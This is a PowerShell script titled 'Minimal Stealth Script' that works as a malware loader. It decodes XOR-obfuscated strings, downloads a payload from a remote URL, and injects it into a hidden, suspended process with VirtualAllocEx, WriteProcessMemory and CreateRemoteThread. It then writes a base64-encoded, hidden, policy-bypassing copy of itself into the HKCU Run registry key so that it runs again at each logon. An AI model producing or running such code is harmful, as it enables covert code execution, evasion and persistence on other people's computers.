<#
Minimal Stealth Script
Authorized use only.
#>
function xDe { param([Byte[]]$A, [UInt32]$K, [int]$L=$null) $c=New-Object System.Collections.Generic.List[char]; if($L -ne $null){ for($i=0;$i -lt $L;$i++){ $b=$A[$i] -bxor (($K+$i)-band 0xFF); $c.Add([char]$b) } } else { for($i=0;$i -lt $A.Count;$i++){ if($A[$i] -eq 0x00){ break } $b=$A[$i] -bxor (($K+$i)-band 0xFF); $c.Add([char]$b) } } return -join $c }
[Byte[]]$a0=0xBA,0xA7,0xA0,0xA5,0xA5,0xED,0xF7,0xF6,0xBD,0xB2,0xA8,0xB5,0xAB,0xBD,0xCE,0x82,0x8D,0x8E,0xCB,0x86,0x87,0x8B,0x85,0xD9,0xDF,0xDC,0xDB,0xD8,0xC1,0xA2,0x99,0x9F,0x9B,0x90,0x95,0x99,0xD9,0x85,0x99,0x8E,0xD5,0x89,0x99,0x9B,0x8D,0xD0,0x68,0x64,0x63,0x67,0x77,0x2A,0x6B,0x66,0x61,0x67,0x25,0x69,0x6D,0x6E,0x65,0x64,0x69,0x3F,0x70,0x7A,0x7A,0x00
[UInt32]$k0=3535100370
[Byte[]]$a1=0x11,0x69,0x08,0x02,0x3F,0x39,0x3C,0x36,0x2D,0x28,0x00,0x0E,0x27,0x2C,0x37,0x2E,0x35,0x55,0x50,0x39,0x05,0x0A,0x0C,0x47,0x0F,0x13,0x09,0x00
[UInt32]$k1=3539728722
[Byte[]]$a2=0xA5,0xBA,0xBA,0xE6,0xE4,0x82,0xA8,0xBD,0xBB,0xAF,0xB9,0x8E,0xBB,0xAD,0x96,0x88,0x81,0x86,0x00
[UInt32]$k2=3552769490
$rl=xDe $a0 $k0 67
$hp=xDe $a1 $k1 27
$pers=xDe $a2 $k2 18
$ic=@"
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
public class X {
    [DllImport("kernel32.dll",SetLastError=true,CharSet=CharSet.Auto)]
    public static extern bool CreateProcess(string app, string cmd, IntPtr pAttr, IntPtr tAttr, bool inh, uint fl, IntPtr env, string dir, ref SI si, out PI pi);
    [DllImport("kernel32.dll",SetLastError=true)]
    public static extern IntPtr VirtualAllocEx(IntPtr h, IntPtr a, uint s, uint t, uint p);
    [DllImport("kernel32.dll",SetLastError=true)]
    public static extern bool WriteProcessMemory(IntPtr h, IntPtr a, byte[] buf, int s, out IntPtr r);
    [DllImport("kernel32.dll",SetLastError=true)]
    public static extern IntPtr CreateRemoteThread(IntPtr h, IntPtr attr, uint s, IntPtr a, IntPtr p, uint fl, out IntPtr tid);
    [DllImport("kernel32.dll",SetLastError=true)]
    public static extern uint ResumeThread(IntPtr h);
    [StructLayout(LayoutKind.Sequential,CharSet=CharSet.Auto)]
    public struct SI { public uint cb; public string lpReserved; public string lpDesktop; public string lpTitle; public uint dwX; public uint dwY; public uint dwXSize; public uint dwYSize; public uint dwXCountChars; public uint dwYCountChars; public uint dwFillAttribute; public uint dwFlags; public short wShowWindow; public short cbReserved2; public IntPtr lpReserved2; public IntPtr hStdInput; public IntPtr hStdOutput; public IntPtr hStdError; }
    [StructLayout(LayoutKind.Sequential)]
    public struct PI { public IntPtr hProcess; public IntPtr hThread; public uint dwProcessId; public uint dwThreadId; }
    public static bool I(byte[] p, string t) {
        SI si = new SI(); PI pi = new PI();
        si.cb = (uint)System.Runtime.InteropServices.Marshal.SizeOf(si);
        si.dwFlags = 0x00000001; si.wShowWindow = 0;
        uint f = 0x08000000 | 0x4;
        bool c = CreateProcess(t, null, IntPtr.Zero, IntPtr.Zero, false, f, IntPtr.Zero, null, ref si, out pi);
        if(!c)return false;
        IntPtr a = VirtualAllocEx(pi.hProcess, IntPtr.Zero, (uint)p.Length, 0x3000, 0x40);
        if(a==IntPtr.Zero)return false;
        IntPtr bw;
        bool w = WriteProcessMemory(pi.hProcess, a, p, p.Length, out bw);
        if(!w || bw.ToInt32() != p.Length)return false;
        IntPtr tid;
        IntPtr hT = CreateRemoteThread(pi.hProcess, IntPtr.Zero, 0, a, IntPtr.Zero, 0, out tid);
        if(hT==IntPtr.Zero)return false;
        ResumeThread(pi.hThread);
        return true;
    }
}
"@
$null=Add-Type -TypeDefinition $ic -PassThru -ErrorAction Stop
function dD { param([string]$u); $w=New-Object System.Net.WebClient; return $w.DownloadData($u) }
function iP { param([byte[]]$p, [string]$t); if($p){ [X]::I($p, $t) | Out-Null } }
$pB=dD $rl; if($pB){ iP -p $pB -t $hp }
$inl=@'
function xDe { param([Byte[]]$A, [UInt32]$K, [int]$L=$null) $c=New-Object System.Collections.Generic.List[char]; if($L -ne $null){ for($i=0;$i -lt $L;$i++){ $b=$A[$i] -bxor (($K+$i)-band 0xFF); $c.Add([char]$b) } } else { for($i=0;$i -lt $A.Count;$i++){ if($A[$i] -eq 0x00){ break } $b=$A[$i] -bxor (($K+$i)-band 0xFF); $c.Add([char]$b) } } return -join $c }
[Byte[]]$e0=0xBA,0xA7,0xA0,0xA5,0xA5,0xED,0xF7,0xF6,0xBD,0xB2,0xA8,0xB5,0xAB,0xBD,0xCE,0x82,0x8D,0x8E,0xCB,0x86,0x87,0x8B,0x85,0xD9,0xDF,0xDC,0xDB,0xD8,0xC1,0xA2,0x99,0x9F,0x9B,0x90,0x95,0x99,0xD9,0x85,0x99,0x8E,0xD5,0x89,0x99,0x9B,0x8D,0xD0,0x68,0x64,0x63,0x67,0x77,0x2A,0x6B,0x66,0x61,0x67,0x25,0x69,0x6D,0x6E,0x65,0x64,0x69,0x3F,0x70,0x7A,0x7A,0x00
[UInt32]$k0=3535100370
[Byte[]]$e1=0x11,0x69,0x08,0x02,0x3F,0x39,0x3C,0x36,0x2D,0x28,0x00,0x0E,0x27,0x2C,0x37,0x2E,0x35,0x55,0x50,0x39,0x05,0x0A,0x0C,0x47,0x0F,0x13,0x09,0x00
[UInt32]$k1=3539728722
[Byte[]]$e2=0xA5,0xBA,0xBA,0xE6,0xE4,0x82,0xA8,0xBD,0xBB,0xAF,0xB9,0x8E,0xBB,0xAD,0x96,0x88,0x81,0x86,0x00
[UInt32]$k2=3552769490
$r=xDe $e0 $k0 67; $t=xDe $e1 $k1 27; $persid=xDe $e2 $k2 18; $persid=$persid -replace "^win32",""
$null=Add-Type -TypeDefinition @"
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
public class X {
    [DllImport("kernel32.dll",SetLastError=true,CharSet=CharSet.Auto)]
    public static extern bool CreateProcess(string a, string c, IntPtr p, IntPtr t, bool i, uint f, IntPtr e, string d, ref SI si, out PI pi);
    [DllImport("kernel32.dll",SetLastError=true)]
    public static extern IntPtr VirtualAllocEx(IntPtr h, IntPtr a, uint s, uint t, uint p);
    [DllImport("kernel32.dll",SetLastError=true)]
    public static extern bool WriteProcessMemory(IntPtr h, IntPtr a, byte[] b, int s, out IntPtr r);
    [DllImport("kernel32.dll",SetLastError=true)]
    public static extern IntPtr CreateRemoteThread(IntPtr h, IntPtr a, uint s, IntPtr a2, IntPtr p, uint f, out IntPtr tid);
    [DllImport("kernel32.dll",SetLastError=true)]
    public static extern uint ResumeThread(IntPtr h);
    [StructLayout(LayoutKind.Sequential,CharSet=CharSet.Auto)]
    public struct SI { public uint cb; public string lpReserved; public string lpDesktop; public string lpTitle; public uint dwX; public uint dwY; public uint dwXSize; public uint dwYSize; public uint dwXCountChars; public uint dwYCountChars; public uint dwFillAttribute; public uint dwFlags; public short wShowWindow; public short cbReserved2; public IntPtr lpReserved2; public IntPtr hStdInput; public IntPtr hStdOutput; public IntPtr hStdError; }
    [StructLayout(LayoutKind.Sequential)]
    public struct PI { public IntPtr hProcess; public IntPtr hThread; public uint dwProcessId; public uint dwThreadId; }
    public static bool I(byte[] p, string t) {
        SI si = new SI(); PI pi = new PI();
        si.cb = (uint)System.Runtime.InteropServices.Marshal.SizeOf(si);
        si.dwFlags = 0x00000001; si.wShowWindow = 0;
        uint f = 0x08000000 | 0x4;
        bool c = CreateProcess(t, null, IntPtr.Zero, IntPtr.Zero, false, f, IntPtr.Zero, null, ref si, out pi);
        if(!c)return false;
        IntPtr a = VirtualAllocEx(pi.hProcess, IntPtr.Zero, (uint)p.Length, 0x3000, 0x40);
        if(a==IntPtr.Zero)return false;
        IntPtr bw;
        bool w = WriteProcessMemory(pi.hProcess, a, p, p.Length, out bw);
        if(!w || bw.ToInt32() != p.Length)return false;
        IntPtr tid;
        IntPtr hT = CreateRemoteThread(pi.hProcess, IntPtr.Zero, 0, a, IntPtr.Zero, 0, out tid);
        if(hT==IntPtr.Zero)return false;
        ResumeThread(pi.hThread);
        return true;
    }
}
"@
$d=New-Object System.Net.WebClient; $pd=$d.DownloadData($r); if($pd){ [X]::I($pd, $t) | Out-Null }
'@
$encInl=[Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($inl))
$cmdRun="powershell.exe -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -EncodedCommand $encInl"
$rkEnc="SEtDVTpcU29mdHdhcmVcTWljcm9zb2Z0XFdpbmRvd3NcQ3VycmVudFZlcnNpb25cUnVuDQo="
$rk=[System.Text.Encoding]::ASCII.GetString([Convert]::FromBase64String($rkEnc)).Trim()
New-ItemProperty -Path $rk -Name $pers -Value $cmdRun -PropertyType String -Force | Out-Null
